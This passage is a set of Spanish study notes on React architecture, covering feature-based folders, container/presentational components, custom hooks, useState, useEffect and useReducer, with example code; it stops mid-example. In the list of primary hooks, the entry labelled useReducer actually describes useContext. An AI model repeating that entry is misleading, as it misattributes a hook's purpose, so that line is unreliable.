# ARQ

## Organización

No agrupar por tipo de archivo (components/, hooks/, utils/)
Agrupar por Módulo o Característica de Negocio/feature

```
src/
├── features/               # Agrupación por Característica (El Core de la app)
│   ├── UserProfile/        # Módulo: Perfil de Usuario
│       ├── components/     # Componentes de presentación específicos del módulo
│       │   ├── UserCard.tsx
│       │   └── EditForm.tsx
│       ├── hooks/          # Custom Hooks específicos del módulo
│       │   └── useUserProfile.ts 
│       ├── UserProfile.tsx # Componente Contenedor principal
│       └── index.ts        # Archivo para exportaciones (Barrel File)
├── shared/                 # Elementos reutilizables y transversales
│   ├── components/         # Componentes 'dumb' muy reutilizables (Botón, Modal, Layout)
│   ├── hooks/              # Custom Hooks genéricos (ej. useLocalStorage)
│   ├── utils/              # Funciones auxiliares (ej. formatCurrency)
│   └── types/              # Definiciones globales de tipos e interfaces
│
├── store/                  # Gestión de estado global (Redux, Zustand, etc.)
├── api/                    # Lógica de acceso a datos (fetch, axios)
├── pages/                  # Componentes/Rutas para el enrutador (si no usas Next.js)
├── styles/                 # Archivos de estilos globales (CSS, SCSS)
└── App.tsx                 # Componente principal de la aplicación
```

features/ (o modules/): Contiene los componentes Contenedor que encapsulan la lógica de una parte específica de la aplicación. Dentro de cada característica, agrupa los componentes y hooks que solo se usan allí.
shared/ (o common/): Contiene componentes, hooks o utilidades que se usan en múltiples características o módulos. Son los elementos verdaderamente reutilizables de la aplicación.
api/ (o services/): Contiene la implementación del Patrón Repository, aislando la lógica de acceso a datos (peticiones HTTP) de los componentes


### CSS: 

```
src/
├── styles/          # Estilos globales y temas
│   ├── theme.css        # Variables CSS (colores, espaciado)
│   └── global.css       # Estilos base o resets
│
└── components/      # Biblioteca de Componentes Presentacionales
    ├── ui/          # Átomos y Moléculas (Componentes genéricos/reutilizables)
    │   ├── Button/
    │   │   ├── Button.jsx       # Componente (recibe onClick, variant)
    │   │   └── Button.module.css # Estilos con CSS Modules
    |	|
    ├── layouts/     # Plantillas y Estructuras de Alto Nivel (Organismos)
    │   ├── Header/
    │   │   └── Header.jsx       # Recibe props para el menú, logo, etc.
    │   │
    │   ├── Sidebar/
    │   │   └── Sidebar.jsx
    │   │
    │   └── Layout.jsx           # Combina Header, Sidebar y Footer (y usa <Outlet>)
    │
    └── domain/      # Componentes Presentacionales específicos del negocio
        └── ProductCard/
            ├── ProductCard.jsx  # Usa <Button> y <Card> de la capa 'ui'
            └── ProductCard.module.css         
```

components/ui/ (Átomos/Moléculas)
Rol: Son los bloques de construcción más pequeños y genéricos. No tienen conocimiento de la lógica de negocio.
Responsabilidad: Deben ser reutilizables en cualquier parte de la aplicación.
Contenido: Un solo archivo de componente (.jsx) y su archivo de estilos (.module.css o .js si usas CSS-in-JS) deben estar juntos en una misma carpeta.

components/layouts/ (Organismos/Plantillas)
Rol: Definen la estructura principal de la interfaz de usuario.
Responsabilidad: Componen varios componentes de la capa ui/ para formar secciones completas (ej. el Header combina un Logo, un Button y la Nav).
Nota: En una aplicación con Rutas Anidadas, el Layout.jsx a menudo es el componente padre que contiene el <Outlet>.

components/domain/ (Presentacionales Específicos)
Rol: Componentes de presentación que son específicos de un dominio de negocio (ej. ProductCard, UserAvatar, CheckoutSummary).
Responsabilidad: Aunque son presentacionales, usan la terminología del negocio. Estos componentes componen los elementos básicos de la capa ui/.
Ejemplo: ProductCard.jsx usa el <Card> y el <Button> genéricos

styles/ (La Base Visual)
Rol: Contiene la Guía de Estilo de la aplicación.
Responsabilidad: Definir las variables CSS o tokens de diseño para asegurar que el color, la tipografía y el espaciado sean uniformes en todos los componentes de la biblioteca de UI.


components/ui/ o components/atoms/: Para componentes presentacionales genéricos y reutilizables (ej. Boton, Input, Icono).
components/layouts/ o components/templates/: Para estructuras de alto nivel (ej. Header, Sidebar, Footer).
pages/ o views/: Componentes contenedores que generalmente están conectados al router y manejan la lógica de la vista (ej. LoginPage, DashboardPage).





## SRP

Dividir componente que hace tres cosas: gestionar el estado, llamar a la API y mostrar la UI.
Si queremos cambiar el diseño (CSS), o si queremos reutilizar la lógica de carga de datos en otro lugar, tenemos que modificar todo el archivo.

### Componente monolítico:

```
// UserProfile.jsx (Componente con Múltiples Responsabilidades)
import React, { useState, useEffect } from 'react';
import axios from 'axios';

const UserProfile = ({ userId }) => {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);

  // 1. RESPONSABILIDAD: Recuperación de Datos (Lógica)
  useEffect(() => {
    const fetchUser = async () => {
      try {
        const response = await axios.get(`/api/users/${userId}`);
        setUser(response.data);
      } catch (err) {
        setError("Error al cargar los datos.");
      } finally {
        setIsLoading(false);
      }
    };
    fetchUser();
  }, [userId]);

  // 2. RESPONSABILIDAD: Lógica de Rendereado Condicional
  if (isLoading) {
    return <p>Cargando perfil...</p>;
  }

  if (error) {
    return <div className="error">{error}</div>;
  }

  // 3. RESPONSABILIDAD: Presentación de la UI (Apariencia)
  return (
    <div className="profile-card">
      <img src={user.avatarUrl} alt={`Avatar de ${user.name}`} className="avatar" />
      <h2>{user.name}</h2>
      <p>Email: {user.email}</p>
      <div className="details">
        {user.bio ? <p>{user.bio}</p> : <p>Sin biografía.</p>}
      </div>
    </div>
  );
};

export default UserProfile;
```


### Componente SRP:

Creamos dos componentes siguiendo el patrón de Contenedor/Presentacional

1. ui component

Recibe datos

```
// UserDetails.jsx (Responsabilidad Única: Presentación)
// Recibe los datos ya listos como props
const UserDetails = ({ user }) => {
  return (
    <div className="profile-card">
      <img src={user.avatarUrl} alt={`Avatar de ${user.name}`} className="avatar" />
      <h2>{user.name}</h2>
      <p>Email: {user.email}</p>
      <div className="details">
        {user.bio ? <p>{user.bio}</p> : <p>Sin biografía.</p>}
      </div>
    </div>
  );
};

export default UserDetails;
```


2. Contenedor

Maneja el estado, la lógica de la API, y el rendereado condicional (cargando, error, éxito). 

pasa los datos listos al componente Presentacional

```
// UserProfileContainer.jsx (Responsabilidad Única: Lógica y Estado)
import React, { useState, useEffect } from 'react';
import axios from 'axios';
import UserDetails from './UserDetails'; // Importa el componente presentacional

const UserProfileContainer = ({ userId }) => {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);

  // Lógica de recuperación de datos (Única Responsabilidad Lógica)
  useEffect(() => {
    const fetchUser = async () => {
      // ... (código de axios y try/catch, igual que antes) ...
      try {
        const response = await axios.get(`/api/users/${userId}`);
        setUser(response.data);
      } catch (err) {
        setError("Error al cargar los datos.");
      } finally {
        setIsLoading(false);
      }
    };
    fetchUser();
  }, [userId]);

  // Lógica de rendereado condicional
  if (isLoading) {
    return <p>Cargando perfil...</p>;
  }

  if (error) {
    return <div className="error">{error}</div>;
  }
  
  // Pasa los datos al componente Presentacional
  return <UserDetails user={user} />;
};

export default UserProfileContainer;
```



### Componente descoplado al máximo:

Extraer lógica de un componente smart/contenedor con Custom Hook

La lógica de la llamada a la API y el manejo del estado (isLoading, error, user)
Se encapsulan y se vuelven portátiles.

Custom Hook: función js cuyo nombre comienza con use
Puede llamar a otros Hooks de React (como useState y useEffect).


1. Crear el custom hook 

useUser.js que contendrá la lógica de obtención de datos. 

```
// useUser.js (Custom Hook: Responsabilidad Única: Gestión de Datos)
import { useState, useEffect } from 'react';
import axios from 'axios';

// El hook acepta el ID del recurso que necesita (userId)
const useUser = (userId) => {
  const [user, setUser] = useState(null);
  const [isLoading, setIsLoading] = useState(true);
  const [error, setError] = useState(null);

  useEffect(() => {
    // Definimos la función de fetch dentro del efecto
    const fetchUser = async () => {
      setIsLoading(true);
      setError(null); // Limpiar errores anteriores

      try {
        const response = await axios.get(`/api/users/${userId}`);
        setUser(response.data);
      } catch (err) {
        setError(err.message || "Error al obtener los datos del usuario.");
        setUser(null);
      } finally {
        setIsLoading(false);
      }
    };

    if (userId) {
      fetchUser();
    }
  }, [userId]); // Dependencia del hook: se re-ejecuta si el ID cambia

  // El hook retorna un objeto con el estado actual
  return { user, isLoading, error };
};

export default useUser;
```


2. Componente contenedor

UserProfileContainer consumidor de lógica

enfocado en el renderizado condicional, sin useState ni useEffect

```
// UserProfileContainer.jsx (Refactorizado: Solo Consumo de Lógica y Renderizado Condicional)
import React from 'react';
import useUser from './useUser'; // Importa el Custom Hook
import UserDetails from './UserDetails'; // Importa el Presentacional

const UserProfileContainer = ({ userId }) => {
  // 1. Llama al Custom Hook para obtener la lógica y el estado
  const { user, isLoading, error } = useUser(userId);

  // 2. Renderizado Condicional
  if (isLoading) {
    return <p>Cargando perfil...</p>;
  }

  if (error) {
    return <div className="error-message">Error: {error}</div>;
  }
  
  if (!user) {
    return <p>Usuario no encontrado.</p>;
  }

  // 3. Pasa los datos limpios al Componente Presentacional
  return <UserDetails user={user} />;
};

export default UserProfileContainer;
```


3. Componente presentacional

```
const UserDetails = ({ user }) => {
  return (
    <div className="profile-card">
      <img src={user.avatarUrl} alt={`Avatar de ${user.name}`} className="avatar" />
      <h2>{user.name}</h2>
      <p>Email: {user.email}</p>
      <div className="details">
        {user.bio ? <p>{user.bio}</p> : <p>Sin biografía.</p>}
      </div>
    </div>
  );
};

export default UserDetails;
```


# React

## Componentes

Componibilidad y Reutilización:
Componentes agnósticos a su contexto de uso
children: Permitir que los componentes envuelvan contenido arbitrario
Hace que componentes como Modal, Card o Layout sean extremadamente flexibles.

```
// El componente Card no se preocupa por el contenido interno
const Card = ({ children }) => (
  <div className="card-estilo">{children}</div>
);

// Uso: Puede contener lo que sea
<Card>
  <h3>Mi título</h3>
  <p>Mi contenido</p>
</Card>
```

Evitar el "Prop Drilling" con Context o Composición
Context API (useContext) datos globales
Composición para pasar el componente final como prop en lugar de los datos.


Nombrar componentes y props:
Componentes: PascalCase, sustantivos y describir lo que son
Hooks Personalizados: Utiliza camelCase y siempre deben comenzar con use
(Ej: useAuth, useFetchData).
Props Booleanas: Nómbralas con prefijos como is o has para mayor claridad
(Ej: isDisabled, isLoading).

Destructuración de Props:
En lugar de props.name
```
const Greeting = ({ name, age }) => {
  return <h1>Hola, {name}, tienes {age} años</h1>;
};
```

Uso de hooks: 
1. Solo llama a Hooks en la parte superior de tu componente funcional (no dentro de if, bucles o funciones anidadas).
2. Solo llama a Hooks desde componentes funcionales de React o desde otros Hooks personalizados.

Renderizado Condicional Limpio:
```
// Ejemplo de AND lógico (si isLoading es true, muestra el loader)
return (
  <div>
    {isLoading && <Loader />}
    {!isLoading && <p>Datos cargados.</p>}
  </div>
);

```



## Props

pasar datos de un componente padre a un componente hijo
objeto de argumentos
unidireccional (de arriba hacia abajo): del componente padre al componente hijo.
Contenido: Pueden contener cualquier tipo de dato de JavaScript: strings, números, booleanos, funciones, arrays u objetos.

Solo Lectura (Inmutables):
Un componente hijo NUNCA debe
Si un componente necesita cambiar datos: debe manejar su propio Estado (useState)

children:

hijo:

```
// Componente Hijo (Card.jsx)
// El componente usa {children} para renderizar el contenido envuelto.
const Card = ({ titulo, children }) => {
  return (
    <div className="card">
      <h2>{titulo}</h2>
      <div className="card-body">
        {children} {/* Aquí se renderizará el texto o componentes internos */}
      </div>
    </div>
  );
};
```

padre:

```
<Card titulo="Mi Perfil">
  <p>Este texto es la prop 'children'.</p> 
  <button>Ver detalles</button>
</Card>
```

nomenclatura:
Booleans/Banderas prefijos como is- o has- (ej. isLoading, hasError, isDisabled). 
eventos: prefijo on- (ej. onClick, onSubmit, onClose).

##### valores por defectos: para las props opcionales
##### componente resistente reduce verificaciones de undefined dentro de él 

cantidad props:
Desestructura y pasa solo lo que el hijo necesita.
Si el objeto es grande, refactoriza para pasar la parte relevante del objeto.




## hooks

Uso de estado sin clases 

1. Primarios

useState:
Permite que el componente almacene y gestione datos internos
estado simple (numb, str, bool)
estado local persistente. par estado actual y func
Estado que solo necesita un único componente

useEffect:
Permite ejecutar código después de que el componente se haya renderizado
efectos secundarios
acciones que interactúan con el mundo exterior)
llamadas a la API, suscripciones, manipulación manual del DOM
Recuperación de Datos: fetch o axios
Suscripciones: Configurar listeners o timers (requiere función de limpieza en el retorno)
Sincronizar el estado con sistemas externos

useReducer:
Permite a un componente suscribirse a un Contexto de React
leer su valor
Acceso al estado global o configuraciones
tema, usuario autenticado, idioma
sin pasar props a través de múltiples niveles


2. Optimización y rendimiento

evitar recálculos innecesarios y re-renderizados de componentes.

useMemo: Memoriza el valor resultante de una función
Solo recalcula ese valor si las dependencias en el array cambian
Cálculos Costosos: trar grandes arrays o realizar cálculos intensivos que no deben ejecutarse en cada render
Propiedades de Objeto Estables: Asegurar que un objeto o array complejo
pasado a un componente hijo, React.memo mantenga la misma referencia de memoria

useCallback: 
Memoriza la definición de una función (callback).
Solo recrea la función si las dependencias en el array cambian.
Estabilidad de Funciones: Prevenir re-renderizados innecesarios de componentes hijos optimizados con React.memo
cuando se les pasa una función como prop
Usos como dependencias en otros useEffect o useMemo.

useReducer:
Alternativa a useState para el manejo de estado más complejo
o cuando la lógica de la transición del estado es complicada
(basado en el patrón Redux).
Estado Complejo: Manejo de formularios complejos con múltiples campos relacionados
o estados que tienen transiciones bien definidas
(ej. pending, success, error)
Reemplazar múltiples useState interdependientes


3. Referencia y Lógica Avanzada

Acceso directo a elementos del DOM o control sobre valores mutables.

useRef:
Devuelve un objeto de referencia mutable (.current)
que persiste durante todo el ciclo de vida del componente.
No causa re-renderizado cuando cambia.
Acceso al DOM: Referenciar directamente un elemento del DOM para manipularlo
(ej. enfocar un input, medir dimensiones)
Almacenar Valores Mutables: Guardar IDs de timers o valores que deben cambiar sin forzar un re-renderizado

useImperativeHandle:
Se usa junto con React.forwardRef
personalizar el valor que se expone a los componentes padres
cuando usan una ref sobre el componente hijo.
Exposición Selectiva: Exponer solo métodos específicos
(ej. submit(), reset())
de un componente complejo a su padre, ocultando el estado interno

useLayoutEffect:
Idéntico a useEffect, pero se dispara síncronamente
inmediatamente después de que React realiza todas las mutaciones del DOM.
Manipulación del DOM que Afecta el Layout: Realizar mediciones del DOM
(ej. obtener altura de un elemento)
o cambios de estilo antes de que el navegador pinte el resultado final
evitando flashing o parpadeo visual

useDebugValue:
Debugging: Ayudar a otros desarrolladores a inspeccionar el estado interno de un Hook personalizado
sin tocar el código fuente

useInsertionEffect:
Se ejecuta síncronamente después de que el DOM haya sido modificado
pero antes de que se calculen los layouts.
Inyección de CSS-in-JS: Se utiliza principalmente en librerías de estilización
(como Styled Components o Emotion)
para inyectar estilos dinámicos antes de que los diseños del navegador los lean,
evitando problemas de rendimiento



## useState
Permite que un componente "recuerde" información
Se re-renderice (actualice la interfaz) cuando esa información cambia.
datos que un componente necesita para funcionar o para mostrar su UI

```
import React, { useState } from 'react';

const Contador = () => {
  // 1. Llama a useState() con el valor inicial (0)
  // 2. Devuelve [valor, función_para_actualizar_valor]
  const [conteo, setConteo] = useState(0); 

  const incrementar = () => {
    // Usa la función setter para cambiar el valor
    setConteo(conteo + 1);
  };

  return (
    <div>
      <p>Has hecho clic {conteo} veces</p>
      <button onClick={incrementar}>
        Haz clic
      </button>
    </div>
  );
};
```

Nunca modificar el valor directamente, usar la función state

Props vs useState

useState (Estado):
Interno (Propio del componente).
Mutable (Puede cambiar usando la función setter).
No fluye, se mantiene dentro del componente.

Props: 
Externo (Recibido del componente padre).
Inmutable (De solo lectura).
Fluye unidireccionalmente (Padre → Hijo).

nomenclatura:
Si la variable es isOpen, su setter debe ser setIsOpen.

actualización funcional:
setConteo(prevConteo => prevConteo + 1);

Podría fallar si hay múltiples actualizaciones rápidas
setConteo(conteo + 1);

Estado Obsoleto:
1. React Programa el cambio para la próxima re-renderización.
2. React a menudo agrupa (batches) múltiples actualizaciones de estado en una sola re-renderización para optimizar el rendimiento.


### useState: multiples useState separados vs solo useState con objeto/arra

Múltiples useState:
##### Solo se renderiza cuando cambia esa variable de estado específica (más óptimo).
Código más legible para datos no relacionados.
Puede requerir muchas declaraciones useState.
##### Úsalo para variables de estado no relacionadas que cambian independientemente (e.g., count, isOpen, username).

Objeto:
Menos líneas de código (solo una llamada a useState).
##### componente se renderiza si cualquier propiedad del objeto cambia, incluso si otras propiedades no se usan.
##### Úsalo para datos relacionados (e.g., datos de un formulario: firstName, lastName, email).


## Ciclo de Vida y Side Effects: 
##### Montaje, actualización, desmontaje
Desde que nace, se actualiza en la pantalla, hasta que muere y se retira del DOM.
gestiona principalmente a través del Hook useEffect.

Mounting: instancia del componente primera vez en el DOM
ideal para inicializar datos con useEffect
renderizado inicial

Updating:
ocurre cada vez que el estado interno (useState) 
o las propiedades (props) del componente cambian
re-renderizado

unmounting:
ocurre justo antes de que el componente sea eliminado del DOM
ideal para limpieza, deshacer las acciones de useEffect


### Side Effects
##### Se refieren a cualquier acción que realiza un componente que afecta al mundo exterior de la función de renderizado.
se gestiona con useEffect
Un Side Effect es cualquier interacción que ocurre entre el componente de React y el mundo exterior a la función que lo renderiza
Si una acción no se limita a calcular la salida (el JSX) basándose en las entradas (props y state), es un efecto secundario.

ej: 
Recuperación de Datos	Llamadas a una API REST (ej. fetch o axios).	Afecta a un servidor externo para obtener datos.
Manipulación del DOM	Cambiar directamente el título del documento (document.title).	Modifica un elemento global fuera del control de React.
Suscripciones	Conexión a un socket o a una fuente de datos externa.	Crea una conexión persistente que debe ser limpiada
Tiempo	Usar setTimeout o setInterval.	Introduce la gestión del tiempo y recursos del navegador.

```
useEffect(() => {
  // 1. Código del Side Effect (Impuro)

  return () => {
    // 2. Función de Limpieza (Opcional, para Desmontaje)
  };
}, [dependencia1, dependencia2]); // 3. Array de Dependencias (Condicional)
```


## useEffect
Manejar efectos secundarios/side effects (llamadas a API, suscripciones, manipulación manual del DOM).
##### Permite declarar que tu componente necesita hacer algo después del renderizado
##### Es el lugar donde resides el código "impuro" (los Side Effects).

useEffect te da una vía de escape para ejecutar código que:
1. Interactúa con el mundo exterior a React (APIs, DOM del navegador, suscripciones).
2. Debe ejecutarse en un momento controlado (después del montaje, después de ciertas actualizaciones, o antes del desmontaje).


1. Montaje Único (Array Vacío)
React sabe que el efecto no depende de ninguna prop o estado
Solo se ejecuta una vez, después de la primera renderización (Montaje).
Usos Típicos: Llamadas iniciales a APIs, configuración de listeners de eventos globales, inicialización de librerías.

```
// Ejecutar una sola vez al montar el componente
useEffect(() => {
  console.log('Componente montado. Obteniendo datos iniciales...');
  // fetch('/api/data').then(...)
}, []); // Solo en la fase de Montaje
```

2. Actualización Condicional (Array con Variables)
React ejecutará el efecto cada vez que una de esas variables cambie entre renderizados.
Se ejecuta después de la primera renderización y después de cualquier re-renderización donde el valor de las dependencias haya cambiado

Usos Típicos: Cargar nuevos datos cuando un ID de usuario cambia, recalcular valores en respuesta a un cambio de prop específica.

```
// Se ejecuta cuando 'userId' (prop) o 'page' (state) cambian
useEffect(() => {
  console.log(`Cargando datos para el usuario ${userId} en la página ${page}`);
  // fetch(`/api/user/${userId}?page=${page}`)
}, [userId, page]); // Se ejecuta al montar y cuando userId O page cambian
```

3. Cada Renderizado (Sin Array)
el efecto se ejecuta después de cada renderizado (montaje y todas las actualizaciones).
se ejecuta después de cada re-renderización.
Usos Típicos: Es raro y generalmente lleva a problemas de rendimiento o loops infinitos.
Se debe evitar a menos que tengas un motivo muy específico.


Limpieza (Desmontaje)
##### Para los efectos que configuran recursos persistentes (como timers, listeners de eventos, o suscripciones), es vital limpiarlos cuando el componente deja de usarlos.
La función que retorna dentro de useEffect es la función de Limpieza (Cleanup).
se ejecuta:
1. Justo antes de que el componente se desmonte (Fase de Desmontaje).
2. Justo antes de re-ejecutar el efecto si sus dependencias han cambiado.

```
useEffect(() => {
  // Configuración del Efecto (Ej. Suscripción)
  const subscription = chatApi.subscribe(handler);

  return () => {
    // Limpieza (Se ejecuta antes del desmontaje o antes de la próxima ejecución)
    subscription.unsubscribe();
    console.log('Suscripción limpiada.');
  };
}, [chatId]); // Si chatId cambia, se limpia la vieja suscripción y se crea la nueva.
```

prácticas useEffect
Siempre incluye en el array de dependencias todas las variables, props o funciones que se utilizan dentro del cuerpo del efecto y que son definidas fuera de él.
Implementar Siempre la Limpieza (Cleanup)
##### Si tu efecto secundario configura algo que persiste fuera de su ámbito (un recurso)
##### Debes proporcionar una función de limpieza para deshacer esa configuración.
Temporizadores y Oyentes: Para setTimeout, setInterval, o listeners de eventos del navegador, la limpieza es obligatoria
Siempre usa clearTimeout, clearInterval, o removeEventListener en la función de retorno.
Suscripciones: Si te suscribes a un socket o una fuente de datos, asegúrate de desuscribirte en la función de limpieza para evitar fugas de memoria
Llamadas a la API: Si una llamada a la API es larga y el componente se desmonta, esta llamada puede causar un error de "can't perform a React state update on an unmounted component".
Usa AbortController para cancelar la solicitud en la limpieza.


### useEffect: Maneja la Cancelación de Solicitudes Asíncronas

Cuando un componente se desmonta mientras una promesa (como una solicitud fetch o axios) está pendiente
intentar actualizar el estado causará una advertencia de React (memory leak).
La función de limpieza debe cancelar la solicitud o usar un flag (bandera) como en el ejemplo anterior.

```
useEffect(() => {
  let isMounted = true; // Bandera
  
  fetch('/api/data')
    .then(res => res.json())
    .then(data => {
      if (isMounted) { // Solo actualiza si el componente sigue montado
        // setDatos(data);
      }
    });
    
  return () => {
    isMounted = false; // Desactiva la bandera cuando se limpia/desmonta
  };
}, []);
```

### Evitar funciones como dependencias: use useCallback



## Custom Hook 

Función js, su nombre siempre empieza con use
Permitirte reutilizar lógica de estado o de efectos entre múltiples componentes, evitando la duplicación de código

forma de abstraer lógica compleja que utiliza los Hooks internos de React
(useState, useEffect, useContext, useCallback, etc.)
presentar esa lógica de manera limpia y reusable a cualquier componente que lo necesite.

única regla estricta: usar otros Hooks dentro

Resuelven el problema de compartir lógica de estado de una manera muy elegante:

1. Aislamiento de Lógica: Toda la lógica compleja se encapsula dentro del Custom Hook.
2. Devolución de Valores: El Custom Hook puede devolver cualquier cosa que el componente necesite
estado, funciones setter, o funciones manejadoras
3. Independencia: Cuando llamas a un Custom Hook en dos componentes diferentes
cada componente obtiene una copia completamente independiente de ese estado y de esa lógica
El estado no se comparte entre ellos; solo se comparte la lógica de cómo se gestiona ese estado.

### Ej: lógica para un contador que quieres usar en muchos lugares.

1. Definición del Custom Hook (useContador.js)

```
import { useState, useCallback } from 'react';

// El nombre empieza con 'use'
const useContador = (initialValue = 0) => {
  const [contador, setContador] = useState(initialValue);

  // Usa useCallback para garantizar que la función es estable
  const incrementar = useCallback(() => {
    setContador(prevContador => prevContador + 1);
  }, []);

  const decrementar = useCallback(() => {
    setContador(prevContador => prevContador - 1);
  }, []);

  const reset = useCallback(() => {
    setContador(initialValue);
  }, [initialValue]); // Dependencia: initialValue

  // Devuelve el estado y las funciones que los componentes usarán
  return { contador, incrementar, decrementar, reset };
};

export default useContador;
```

2. Uso 
cualquier componente puede consumir esta lógica
manteniendo su propio estado de contador.

```
import useContador from './useContador';

function BotonesContador() {
  // Llama al hook como si fuera una función normal
  const { contador, incrementar, decrementar, reset } = useContador(10); // Estado inicial 10

  return (
    <div>
      <h3>Valor: {contador}</h3>
      <button onClick={incrementar}>+1</button>
      <button onClick={decrementar}>-1</button>
      <button onClick={reset}>Reset</button>
    </div>
  );
}
```

uso de custom hook 
reutilizar la misma lógica de estado y efectos en dos o más componentes.
aislar la lógica compleja (como el data fetching o la validación de formularios) de los componentes de UI
componente sea agnóstico a la implementación de su estado
(solo le importa el resultado final, no cómo se calculó).


practicas: 

Convención de Nombres (use...)
debe describir claramente la intención de la lógica que encapsula

Devuelve un Objeto o Arreglo Bien Definido
Decide si el Hook devolverá un arreglo o un objeto, y sé consistente

array: Similar a useState, fácil de desestructurar con cualquier nombre
El orden es importante: Si añades o cambias un valor, puedes romper el código de los consumidores.
Úsalo para casos muy simples o cuando hay un par estado/setter claro (ej: useContador).

objeto: No depende del orden, puedes desestructurar solo lo que necesitas (ej: { estado, isLoading }).
Requiere usar el mismo nombre en la desestructuración
Úsalo para devolver múltiples valores 
o o para devolver funciones manejadoras (lo más común).

```
// Objeto (Recomendado para Hooks complejos)
return { estado, isLoading, setError, fetchData };

// Arreglo (Solo para casos simples)
return [contador, incrementar];
```

Encapsula lógica: 
Si la lógica de un useEffect o useState se usa en múltiples componentes,
muévela completamente dentro del Custom Hook.

El componente que consume el Hook debe ser agnóstico a la implementación interna
Solo debe preocuparse por renderizar la UI con los valores que recibe.

Acepta Argumentos y Configuración:
tu Hook verdaderamente reusable, debe ser configurable
Permite que los consumidores pasen valores iniciales, parámetros de API, o funciones de callback.

```
// Permite configurar la URL y las opciones de fetch
const useFetch = (url, options = {}) => { /* ... */ };

// Permite configurar el valor inicial del contador
const useContador = (initialValue = 0, step = 1) => { /* ... */ };
```

Estabilizar Funciones y Valores con useCallback y useMemo

##### Si tu Custom Hook devuelve funciones, envuélvelas en useCallback
##### Si devuelve valores complejos que son costosos de calcular, envuélvelos en useMemo.
garantiza que las funciones y objetos devueltos no cambien en cada renderizado del componente consumidor
ayuda a evitar ciclos de renderizado innecesarios en useEffect
y optimiza el rendimiento de los componentes hijos que usan React.memo.

```
// useContador.js
// La función incrementar es estable y solo se crea una vez
const incrementar = useCallback(() => {
    setContador(prevContador => prevContador + 1);
}, []); // Array de dependencias vacío, solo se crea al montar

return { contador, incrementar };
```

Documentación: 
¿Qué devuelve? Describe cada valor devuelto por el Hook.
¿Qué argumentos toma? Describe los tipos y si son opcionales.
Ejemplos de Uso: Muestra un fragmento de código simple donde se consume el Hook.



## useReducer
Alternativa de React a useState para manejar la lógica de estado más compleja
cuando el estado de tu componente es un objeto complejo o un arreglo
cuando las actualizaciones de ese estado dependen de múltiples sub-valores
o implican lógica intrincada, basado en el patrón reducer

1. Estado: valor que deseas manejar, similar al estado de useState. 
Suele ser un objeto o arreglo.

2. Acción: objeto simple que describe qué sucedió
tiene dos propiedades:

type: string que describe el tipo de cambio que debe ocurrir
(ej: 'INCREMENTAR', 'AÑADIR_TAREA', 'CERRAR_MODAL').
Es obligatorio.

payload: Opcional, Contiene los datos que son necesarios para realizar la actualización
(ej: el nuevo valor del input, el ID del ítem a eliminar).

3. Función Reductora (Reducer)
función pura que toma el estado actual actual y una acción y devuelve un nuevo estado.

(currentState,action)→newState

siempre debe ser inmutable: nunca debe modificar el currentState directamente
debe devolver un objeto o arreglo completamente nuevo.

Sintaxis: 

En lugar de devolver solo el estado y un setter
devuelve el estado y una función dispatch.

```
const [state, dispatch] = useReducer(reducer, initialState);
```

state	El valor actual del estado
dispatch	Una función para enviar una acción al Reducer.

reducer	La función que contiene la lógica para calcular el nuevo estado.
initialState	El valor inicial del estado


Ej: gestionar el estado de una lista de tareas:

1. Estado Inicial y la Función Reductora

```
// Estado inicial: un arreglo de objetos de tareas
const initialState = [];

// Función Reductora
function todoReducer(state, action) {
  switch (action.type) {
    case 'AÑADIR_TAREA':
      // Actualización inmutable: crea un nuevo arreglo
      return [
        ...state,
        {
          id: Date.now(),
          texto: action.payload, // El dato que necesitamos añadir
          completada: false,
        },
      ];
    case 'TOGGLE_TAREA':
      // Actualización inmutable: usa map para devolver un nuevo arreglo
      return state.map(tarea =>
        tarea.id === action.payload
          ? { ...tarea, completada: !tarea.completada }
          : tarea
      );
    case 'ELIMINAR_TAREA':
      // Actualización inmutable: usa filter para devolver un nuevo arreglo
      return state.filter(tarea => tarea.id !== action.payload);
    default:
      return state;
  }
}
```

2. Uso en el Componente

```
import React, { useReducer } from 'react';

function TodoList() {
  const [tareas, dispatch] = useReducer(todoReducer, initialState);
  
  const handleAñadir = (texto) => {
    // Envía una acción que el Reducer sabe cómo manejar
    dispatch({
      type: 'AÑADIR_TAREA',
      payload: texto, // El texto de la nueva tarea
    });
  };

  const handleToggle = (id) => {
    dispatch({
      type: 'TOGGLE_TAREA',
      payload: id, // El ID de la tarea a marcar/desmarcar
    });
  };

  return (
    <div>
      {/* ... Lógica de input para llamar a handleAñadir ... */}
      {tareas.map(tarea => (
        <div key={tarea.id}>
          <span 
            onClick={() => handleToggle(tarea.id)}
            style={{ textDecoration: tarea.completada ? 'line-through' : 'none' }}
          >
            {tarea.texto}
          </span>
          {/* ... Botón de eliminar, etc. ... */}
        </div>
      ))}
    </div>
  );
}
```

Uso: 

useState
Estado: simple; booleanos, números, strings.
Lógica actualización: simple; una sola función de setter es suficiente.
funciones: Menos óptimo si necesitas pasar el setter a muchos componentes hijos
(puede causar problemas de re-renderizado).
escala: Componentes pequeños y con poca lógica de estado.

useReducer:
Estado: complejo; objetos con muchos campos, arreglos anidados
Lógica actualización: Múltiples actualizaciones de estado relacionadas
o cuando el nuevo estado depende del estado anterior de manera compleja.
funciones: Ideal para pasar la función dispatch a componentes hijos
dispatch es estable y no se recrea en cada renderizado.
escala: Aplicaciones de tamaño medio a grande donde se prefiere una estructura de estado predecible y centralizada.


Prácticas para useReducer

Usa Constantes para action.type:
Define los tipos de acción como constantes de string fuera del componente
para evitar errores de tipeo y hacer el código más legible y refactorizable.

```
const ACTION_TYPES = {
  FETCH_START: 'FETCH_START',
  FETCH_SUCCESS: 'FETCH_SUCCESS',
  FETCH_ERROR: 'FETCH_ERROR',
};
// Luego lo usas: dispatch({ type: ACTION_TYPES.FETCH_SUCCESS, ... })
```

Convención type y payload:
La acción debe ser un objeto con una propiedad type que describe lo que sucedió
opcionalmente un payload que lleva los datos necesarios para realizar el cambio.

```
// Buena Práctica
dispatch({ type: 'AÑADIR_TAREA', payload: { texto: 'Comprar leche' } });

// Mala Práctica (No descriptivo)
dispatch({ texto: 'Comprar leche' });
```

Reducer como una Función Pura:
No debe tener efectos secundarios: llamadas a API, modificar variables, etc
determinista: misma entrada (state y action), misma salida (newState)

```
// Correcto (Inmutable y Puro)
case 'AÑADIR_TAREA':
  return [...state, action.payload]; // Devuelve un nuevo arreglo

// Incorrecto (Mutación, no puro)
case 'AÑADIR_TAREA':
